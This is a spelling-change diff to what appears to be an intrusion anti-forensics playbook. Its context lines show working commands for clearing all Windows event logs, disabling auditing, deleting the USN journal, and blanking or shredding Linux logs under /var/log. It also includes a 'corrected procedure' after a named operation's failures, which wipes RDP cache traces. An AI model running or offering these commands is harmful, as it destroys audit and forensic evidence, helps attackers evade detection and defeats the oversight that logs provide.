@@ -16,7 +16,7 @@ wevtutil el | Foreach-Object {wevtutil cl "$_"}
 Clear-EventLog -LogName Security
 ```
 
-#### Audit policy neutralization
+#### Audit policy neutralisation
 
 ```
 :: Disable future logging
@@ -33,7 +33,7 @@ fsutil usn deletejournal /D C:  # Destroys file change records
 ### Linux systems
 
 ```bash
-# Multi-tool log sanitization
+# Multi-tool log sanitisation
 echo "" > /var/log/auth.log
 journalctl --vacuum-time=1s  # Systemd logs
 find /var/log -type f -exec shred -n 3 -u {} \;  # Physical destruction
@@ -88,7 +88,7 @@ Operation "Midnight Sun" Failure Points:
 Corrected 2025 Procedure:
 
 ```powershell
-# Full artefact sterilization
+# Full artefact sterilisation
 Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*" -Force
 Cleanmgr /sagerun:6174  # Disk Cleanup silent mode
 ```
